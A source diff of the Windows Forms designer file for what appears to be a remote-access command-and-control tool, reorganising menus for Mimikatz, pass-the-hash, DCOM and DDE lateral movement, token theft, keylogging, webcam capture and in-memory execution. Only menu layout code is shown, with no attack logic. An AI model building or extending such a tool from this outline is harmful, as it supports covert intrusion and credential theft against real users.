@@ -319,7 +463,7 @@ namespace xServer.Forms
             this.standbyToolStripMenuItem});
             this.actionsToolStripMenuItem.Image = global::xServer.Properties.Resources.actions;
             this.actionsToolStripMenuItem.Name = "actionsToolStripMenuItem";
-            this.actionsToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
+            this.actionsToolStripMenuItem.Size = new System.Drawing.Size(192, 22);
             this.actionsToolStripMenuItem.Text = "Actions";
             // 
             // shutdownToolStripMenuItem
@@ -346,12 +490,6 @@ namespace xServer.Forms
             this.standbyToolStripMenuItem.Text = "Standby";
             this.standbyToolStripMenuItem.Click += new System.EventHandler(this.standbyToolStripMenuItem_Click);
             // 
-            // credentialHarvestingToolStripMenuItem
-            // 
-            this.credentialHarvestingToolStripMenuItem.Name = "credentialHarvestingToolStripMenuItem";
-            this.credentialHarvestingToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.credentialHarvestingToolStripMenuItem.Text = "Credential Harvesting";
-            // 
             // networkToolStripMenuItem
             // 
             this.networkToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
@@ -359,7 +497,7 @@ namespace xServer.Forms
             this.lateralMovementToolStripMenuItem2,
             this.persistenceToolStripMenuItem});
             this.networkToolStripMenuItem.Name = "networkToolStripMenuItem";
-            this.networkToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.networkToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
             this.networkToolStripMenuItem.Text = "Network";
             // 
             // informationGatheringToolStripMenuItem1
@@ -431,8 +569,8 @@ namespace xServer.Forms
             // 
             this.lateralMovementToolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.passTheHashToolStripMenuItem1,
-            this.dCOMToolStripMenuItem,
-            this.wMIMethodToolStripMenuItem});
+            this.wMIMethodToolStripMenuItem,
+            this.dCOMToolStripMenuItem});
             this.lateralMovementToolStripMenuItem2.Name = "lateralMovementToolStripMenuItem2";
             this.lateralMovementToolStripMenuItem2.Size = new System.Drawing.Size(192, 22);
             this.lateralMovementToolStripMenuItem2.Text = "Lateral Movement";
@@ -443,7 +581,7 @@ namespace xServer.Forms
             this.wMIExecToolStripMenuItem1,
             this.sMBExecToolStripMenuItem1});
             this.passTheHashToolStripMenuItem1.Name = "passTheHashToolStripMenuItem1";
-            this.passTheHashToolStripMenuItem1.Size = new System.Drawing.Size(152, 22);
+            this.passTheHashToolStripMenuItem1.Size = new System.Drawing.Size(147, 22);
             this.passTheHashToolStripMenuItem1.Text = "Pass the Hash";
             // 
             // wMIExecToolStripMenuItem1
@@ -460,17 +598,104 @@ namespace xServer.Forms
             this.sMBExecToolStripMenuItem1.Text = "SMB Command Exec";
             this.sMBExecToolStripMenuItem1.Click += new System.EventHandler(this.sMBExecToolStripMenuItem1_Click);
             // 
-            // dCOMToolStripMenuItem
-            // 
-            this.dCOMToolStripMenuItem.Name = "dCOMToolStripMenuItem";
-            this.dCOMToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
-            this.dCOMToolStripMenuItem.Text = "DCOM";
-            // 
             // wMIMethodToolStripMenuItem
             // 
             this.wMIMethodToolStripMenuItem.Name = "wMIMethodToolStripMenuItem";
-            this.wMIMethodToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
-            this.wMIMethodToolStripMenuItem.Text = "WMI Method";
+            this.wMIMethodToolStripMenuItem.Size = new System.Drawing.Size(147, 22);
+            this.wMIMethodToolStripMenuItem.Text = "WMI";
+            // 
+            // dCOMToolStripMenuItem
+            // 
+            this.dCOMToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.mSWORDDDEToolStripMenuItem,
+            this.excelDDEToolStripMenuItem,
+            this.mMC20ApplicationToolStripMenuItem,
+            this.sHELLWINDOWSToolStripMenuItem,
+            this.shellBrowserWindowToolStripMenuItem,
+            this.visioAddonExecutionToolStripMenuItem,
+            this.outlookExecutionToolStripMenuItem,
+            this.arbitraryLibraryLoadToolStripMenuItem,
+            this.wordWLLAddInToolStripMenuItem,
+            this.outlookScriptExecutionToolStripMenuItem,
+            this.visioExecuteLineToolStripMenuItem,
+            this.officeMacroToolStripMenuItem});
+            this.dCOMToolStripMenuItem.Name = "dCOMToolStripMenuItem";
+            this.dCOMToolStripMenuItem.Size = new System.Drawing.Size(147, 22);
+            this.dCOMToolStripMenuItem.Text = "DCOM";
+            // 
+            // mSWORDDDEToolStripMenuItem
+            // 
+            this.mSWORDDDEToolStripMenuItem.Name = "mSWORDDDEToolStripMenuItem";
+            this.mSWORDDDEToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.mSWORDDDEToolStripMenuItem.Text = "MSWORD DDE";
+            this.mSWORDDDEToolStripMenuItem.Click += new System.EventHandler(this.mSWORDDDEToolStripMenuItem_Click);
+            // 
+            // excelDDEToolStripMenuItem
+            // 
+            this.excelDDEToolStripMenuItem.Name = "excelDDEToolStripMenuItem";
+            this.excelDDEToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.excelDDEToolStripMenuItem.Text = "Excel DDE";
+            // 
+            // mMC20ApplicationToolStripMenuItem
+            // 
+            this.mMC20ApplicationToolStripMenuItem.Name = "mMC20ApplicationToolStripMenuItem";
+            this.mMC20ApplicationToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.mMC20ApplicationToolStripMenuItem.Text = "MMC20.Application";
+            // 
+            // sHELLWINDOWSToolStripMenuItem
+            // 
+            this.sHELLWINDOWSToolStripMenuItem.Name = "sHELLWINDOWSToolStripMenuItem";
+            this.sHELLWINDOWSToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.sHELLWINDOWSToolStripMenuItem.Text = "ShellWindows";
+            this.sHELLWINDOWSToolStripMenuItem.Click += new System.EventHandler(this.sHELLWINDOWSToolStripMenuItem_Click);
+            // 
+            // shellBrowserWindowToolStripMenuItem
+            // 
+            this.shellBrowserWindowToolStripMenuItem.Name = "shellBrowserWindowToolStripMenuItem";
+            this.shellBrowserWindowToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.shellBrowserWindowToolStripMenuItem.Text = "ShellBrowserWindow";
+            // 
+            // visioAddonExecutionToolStripMenuItem
+            // 
+            this.visioAddonExecutionToolStripMenuItem.Name = "visioAddonExecutionToolStripMenuItem";
+            this.visioAddonExecutionToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.visioAddonExecutionToolStripMenuItem.Text = "Visio Addon Execution";
+            // 
+            // outlookExecutionToolStripMenuItem
+            // 
+            this.outlookExecutionToolStripMenuItem.Name = "outlookExecutionToolStripMenuItem";
+            this.outlookExecutionToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.outlookExecutionToolStripMenuItem.Text = "Outlook Execution";
+            // 
+            // arbitraryLibraryLoadToolStripMenuItem
+            // 
+            this.arbitraryLibraryLoadToolStripMenuItem.Name = "arbitraryLibraryLoadToolStripMenuItem";
+            this.arbitraryLibraryLoadToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.arbitraryLibraryLoadToolStripMenuItem.Text = "Arbitrary Library Load";
+            // 
+            // wordWLLAddInToolStripMenuItem
+            // 
+            this.wordWLLAddInToolStripMenuItem.Name = "wordWLLAddInToolStripMenuItem";
+            this.wordWLLAddInToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.wordWLLAddInToolStripMenuItem.Text = "Word WLL Add-In";
+            // 
+            // outlookScriptExecutionToolStripMenuItem
+            // 
+            this.outlookScriptExecutionToolStripMenuItem.Name = "outlookScriptExecutionToolStripMenuItem";
+            this.outlookScriptExecutionToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.outlookScriptExecutionToolStripMenuItem.Text = "OutlookScript Execution";
+            // 
+            // visioExecuteLineToolStripMenuItem
+            // 
+            this.visioExecuteLineToolStripMenuItem.Name = "visioExecuteLineToolStripMenuItem";
+            this.visioExecuteLineToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.visioExecuteLineToolStripMenuItem.Text = "Visio ExecuteLine";
+            // 
+            // officeMacroToolStripMenuItem
+            // 
+            this.officeMacroToolStripMenuItem.Name = "officeMacroToolStripMenuItem";
+            this.officeMacroToolStripMenuItem.Size = new System.Drawing.Size(201, 22);
+            this.officeMacroToolStripMenuItem.Text = "Office Macro";
             // 
             // persistenceToolStripMenuItem
             // 
@@ -483,12 +708,11 @@ namespace xServer.Forms
             this.surveillanceToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.remoteDesktopToolStripMenuItem,
             this.remoteWebcamToolStripMenuItem,
-            this.oSPasswordRecoveryToolStripMenuItem,
             this.passwordRecoveryToolStripMenuItem,
             this.keyloggerToolStripMenuItem});
             this.surveillanceToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("surveillanceToolStripMenuItem.Image")));
             this.surveillanceToolStripMenuItem.Name = "surveillanceToolStripMenuItem";
-            this.surveillanceToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.surveillanceToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
             this.surveillanceToolStripMenuItem.Text = "Surveillance";
             // 
             // remoteDesktopToolStripMenuItem
@@ -506,20 +730,6 @@ namespace xServer.Forms
             this.remoteWebcamToolStripMenuItem.Size = new System.Drawing.Size(220, 22);
             this.remoteWebcamToolStripMenuItem.Text = "Remote Webcam";
             this.remoteWebcamToolStripMenuItem.Click += new System.EventHandler(this.remoteWebcamToolStripMenuItem_Click);
-            // 
-            // oSPasswordRecoveryToolStripMenuItem
-            // 
-            this.oSPasswordRecoveryToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.mimikatzToolStripMenuItem});
-            this.oSPasswordRecoveryToolStripMenuItem.Name = "oSPasswordRecoveryToolStripMenuItem";
-            this.oSPasswordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(220, 22);
-            this.oSPasswordRecoveryToolStripMenuItem.Text = "OS Password Recovery";
-            // 
-            // mimikatzToolStripMenuItem
-            // 
-            this.mimikatzToolStripMenuItem.Name = "mimikatzToolStripMenuItem";
-            this.mimikatzToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
-            this.mimikatzToolStripMenuItem.Text = "Mimikatz";
             // 
             // passwordRecoveryToolStripMenuItem
             // 
@@ -546,14 +756,16 @@ namespace xServer.Forms
             this.openChatToolStripMenuItem});
             this.miscellaneousToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("miscellaneousToolStripMenuItem.Image")));
             this.miscellaneousToolStripMenuItem.Name = "miscellaneousToolStripMenuItem";
-            this.miscellaneousToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.miscellaneousToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
             this.miscellaneousToolStripMenuItem.Text = "Miscellaneous";
             // 
             // remoteExecuteToolStripMenuItem
             // 
             this.remoteExecuteToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.localFileToolStripMenuItem,
-            this.webFileToolStripMenuItem});
+            this.webFileToolStripMenuItem,
+            this.localFileInMemoryToolStripMenuItem,
+            this.nETAssemblyInMemoryToolStripMenuItem});
             this.remoteExecuteToolStripMenuItem.Image = global::xServer.Properties.Resources.lightning;
             this.remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
             this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
@@ -563,7 +775,7 @@ namespace xServer.Forms
             // 
             this.localFileToolStripMenuItem.Image = global::xServer.Properties.Resources.drive_go;
             this.localFileToolStripMenuItem.Name = "localFileToolStripMenuItem";
-            this.localFileToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
+            this.localFileToolStripMenuItem.Size = new System.Drawing.Size(222, 22);
             this.localFileToolStripMenuItem.Text = "Local File...";
             this.localFileToolStripMenuItem.Click += new System.EventHandler(this.localFileToolStripMenuItem_Click);
             // 
@@ -571,9 +783,22 @@ namespace xServer.Forms
             // 
             this.webFileToolStripMenuItem.Image = global::xServer.Properties.Resources.world_go;
             this.webFileToolStripMenuItem.Name = "webFileToolStripMenuItem";
-            this.webFileToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
+            this.webFileToolStripMenuItem.Size = new System.Drawing.Size(222, 22);
             this.webFileToolStripMenuItem.Text = "Web File...";
             this.webFileToolStripMenuItem.Click += new System.EventHandler(this.webFileToolStripMenuItem_Click);
+            // 
+            // localFileInMemoryToolStripMenuItem
+            // 
+            this.localFileInMemoryToolStripMenuItem.Name = "localFileInMemoryToolStripMenuItem";
+            this.localFileInMemoryToolStripMenuItem.Size = new System.Drawing.Size(222, 22);
+            this.localFileInMemoryToolStripMenuItem.Text = "Local PE File (In Memory)";
+            // 
+            // nETAssemblyInMemoryToolStripMenuItem
+            // 
+            this.nETAssemblyInMemoryToolStripMenuItem.Name = "nETAssemblyInMemoryToolStripMenuItem";
+            this.nETAssemblyInMemoryToolStripMenuItem.Size = new System.Drawing.Size(222, 22);
+            this.nETAssemblyInMemoryToolStripMenuItem.Text = ".NET Assembly (In Memory)";
+            this.nETAssemblyInMemoryToolStripMenuItem.Click += new System.EventHandler(this.nETAssemblyInMemoryToolStripMenuItem_Click);
             // 
             // visitWebsiteToolStripMenuItem
             // 
@@ -601,13 +826,13 @@ namespace xServer.Forms
             // lineToolStripMenuItem
             // 
             this.lineToolStripMenuItem.Name = "lineToolStripMenuItem";
-            this.lineToolStripMenuItem.Size = new System.Drawing.Size(149, 6);
+            this.lineToolStripMenuItem.Size = new System.Drawing.Size(158, 6);
             // 
             // selectAllToolStripMenuItem
             // 
             this.selectAllToolStripMenuItem.Name = "selectAllToolStripMenuItem";
-            this.selectAllToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
-            this.selectAllToolStripMenuItem.Text = "Select All";
+            this.selectAllToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
+            this.selectAllToolStripMenuItem.Text = "Select All Clients";
             this.selectAllToolStripMenuItem.Click += new System.EventHandler(this.selectAllToolStripMenuItem_Click);
             // 
             // imgFlags
@@ -986,10 +1211,11 @@ namespace xServer.Forms
             this.fIleToolStripMenuItem,
             this.settingsToolStripMenuItem,
             this.builderToolStripMenuItem,
-            this.aboutToolStripMenuItem});
+            this.aboutToolStripMenuItem,
+            this.serverToolStripMenuItem});
             this.menuStrip.Location = new System.Drawing.Point(0, 0);
             this.menuStrip.Name = "menuStrip";
-            this.menuStrip.Size = new System.Drawing.Size(216, 25);
+            this.menuStrip.Size = new System.Drawing.Size(267, 25);
             this.menuStrip.TabIndex = 2;
             // 
             // fIleToolStripMenuItem
@@ -1004,7 +1230,7 @@ namespace xServer.Forms
             // closeToolStripMenuItem
             // 
             this.closeToolStripMenuItem.Name = "closeToolStripMenuItem";
-            this.closeToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.closeToolStripMenuItem.Size = new System.Drawing.Size(108, 22);
             this.closeToolStripMenuItem.Text = "Close";
             this.closeToolStripMenuItem.Click += new System.EventHandler(this.closeToolStripMenuItem_Click);
             // 
@@ -1028,6 +1254,21 @@ namespace xServer.Forms
             this.aboutToolStripMenuItem.Size = new System.Drawing.Size(52, 21);
             this.aboutToolStripMenuItem.Text = "About";
             this.aboutToolStripMenuItem.Click += new System.EventHandler(this.aboutToolStripMenuItem_Click);
+            // 
+            // serverToolStripMenuItem
+            // 
+            this.serverToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.hostFileToolStripMenuItem});
+            this.serverToolStripMenuItem.Name = "serverToolStripMenuItem";
+            this.serverToolStripMenuItem.Size = new System.Drawing.Size(51, 21);
+            this.serverToolStripMenuItem.Text = "Server";
+            // 
+            // hostFileToolStripMenuItem
+            // 
+            this.hostFileToolStripMenuItem.Name = "hostFileToolStripMenuItem";
+            this.hostFileToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
+            this.hostFileToolStripMenuItem.Text = "Host File";
+            this.hostFileToolStripMenuItem.Click += new System.EventHandler(this.hostFileToolStripMenuItem_Click);
             // 
             // FrmMain
             // 
@@ -1072,29 +1313,23 @@ namespace xServer.Forms
         private System.Windows.Forms.ToolStripMenuItem uninstallToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem surveillanceToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem taskManagerToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem fileManagerToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader hAccountType;
-        private System.Windows.Forms.ToolStripMenuItem systemInformationToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader hUserStatus;
         private System.Windows.Forms.ToolStripMenuItem miscellaneousToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem visitWebsiteToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem showMessageboxToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem updateToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem remoteShellToolStripMenuItem;
         private System.Windows.Forms.ToolStripSeparator ctxtLine;
         private System.Windows.Forms.ToolStripMenuItem actionsToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem shutdownToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem restartToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem standbyToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem startupManagerToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem remoteExecuteToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem localFileToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem webFileToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem reverseProxyToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem registryEditorToolStripMenuItem;
         private AeroListView lstClients;
         private System.Windows.Forms.NotifyIcon notifyIcon;
         private System.Windows.Forms.ColumnHeader hUserPC;
@@ -1109,8 +1344,6 @@ namespace xServer.Forms
         private System.Windows.Forms.ToolStripMenuItem aboutToolStripMenuItem;
         private System.Windows.Forms.StatusStrip statusStrip;
         private System.Windows.Forms.ToolStripStatusLabel listenToolStripStatusLabel;
-        private System.Windows.Forms.ToolStripMenuItem elevateClientPermissionsToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem connectionsToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem remoteWebcamToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem openChatToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem viewLogToolStripMenuItem;
@@ -1121,14 +1354,12 @@ namespace xServer.Forms
         private System.Windows.Forms.ToolStripMenuItem passTheHashToolStripMenuItem1;
         private System.Windows.Forms.ToolStripMenuItem wMIExecToolStripMenuItem1;
         private System.Windows.Forms.ToolStripMenuItem sMBExecToolStripMenuItem1;
-        private System.Windows.Forms.ToolStripMenuItem situationalAwarenessChecksToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem privilegeEscalationToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem privilegeEscalationChecksToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem credentialHarvestingToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem hostToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem portScanToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem persistenceToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem runLocalWMICommandToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem getCurrentDomainControllerToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem getFileServersToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem enumerateGPOToolStripMenuItem;
@@ -1136,8 +1367,47 @@ namespace xServer.Forms
         private System.Windows.Forms.ToolStripMenuItem enumerateSessionsToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem dCOMToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem wMIMethodToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem oSPasswordRecoveryToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem mimikatzToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem excelDDEToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem mMC20ApplicationToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem sHELLWINDOWSToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem shellBrowserWindowToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem visioAddonExecutionToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem outlookExecutionToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem arbitraryLibraryLoadToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem wordWLLAddInToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem outlookScriptExecutionToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem visioExecuteLineToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem officeMacroToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem informationGatheringToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem systemInformationToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem askToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem interactionToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem fileManagerToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem startupManagerToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem remoteShellToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem taskManagerToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem tCPConnectionsToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem registryEditorToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem runLocalWMICommandToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem situationalAwarenessChecksToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem mimikatzToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem persistenceToolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem wMIToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem registryRunKeyToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem scheduledTasksToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem newServiceToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem serverToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem hostFileToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem localFileInMemoryToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem nETAssemblyInMemoryToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem sessionGopherToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem mSWORDDDEToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem impersonationToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem makeTokenToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem stealProcessTokenToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem revertToSelfToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem beginImpersonationToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem powerPickToolStripMenuItem;
     }
 }
 
